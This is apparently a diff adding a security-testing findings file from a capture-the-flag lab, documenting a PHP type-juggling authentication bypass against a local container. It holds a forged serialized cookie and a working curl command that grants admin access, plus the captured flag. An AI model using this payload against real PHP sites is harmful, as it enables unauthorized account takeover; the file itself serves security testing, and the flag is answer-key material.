@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:28:16.500334+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a4ff0816-7522-4765-a7ec-a51e77e75129",
+      "timestamp": "2026-04-12T21:28:16.500199+00:00",
+      "title": "PHP Type Juggling Authentication Bypass (AUTH 04)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:52929",
+      "description": "The application stores login credentials in a client-controlled cookie as base64-encoded PHP serialized data with no HMAC/signature. The server-side password comparison uses PHP's loose equality operator (==) instead of strict (===). By forging a cookie with the password set to PHP boolean `true` (serialized as `b:1;`), the comparison `true == $any_string` always evaluates to TRUE, bypassing authentication entirely. Combined with username='admin', this grants admin access and reveals the flag.",
+      "evidence": "Forged cookie: a:2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";b:1;} -> base64 -> creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==\n\nResponse: <center><h2>Welcome Admin</h2></center><center><h3>Congratulations, here is the flag: flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}</h3></center>\n\nFLAG: flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -b 'creds=YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtiOjE7fQ==' http://172.17.0.1:52929/index.php",
+        "expected": "Welcome Admin + flag{f42b6ccb-617d-4aad-b3ea-f96f1d1c85a3}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "685dd85b-b612-4033-b272-ab780e54fd10",
+      "timestamp": "2026-04-12T21:28:24.774777+00:00",
+      "title": "AUTH 04 Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] -->|POST username+password| LoginForm[\"Login Form /index.php\"]\n  LoginForm -->|serialize+base64+set-cookie| Cookie[\"creds Cookie\"]\n  Cookie -->|302 redirect| IndexPHP[\"index.php GET\"]\n  IndexPHP -->|unserialize+base64_decode| DataArray[\"PHP Array username+password\"]\n  DataArray -->|loose == comparison| AuthCheck[\"Auth Check\"]\n  AuthCheck -->|true == any_string| AdminPage[\"Welcome Admin + Flag\"]\n  AuthCheck -->|false| LoginPage[\"Login Form again\"]\n  IndexPHP --> StaticDir[\"static/ directory 403\"]\n  Stack[\"Stack: Apache 2.4.25 + PHP 5.6.40\"]"
+    }
+  ]
+}
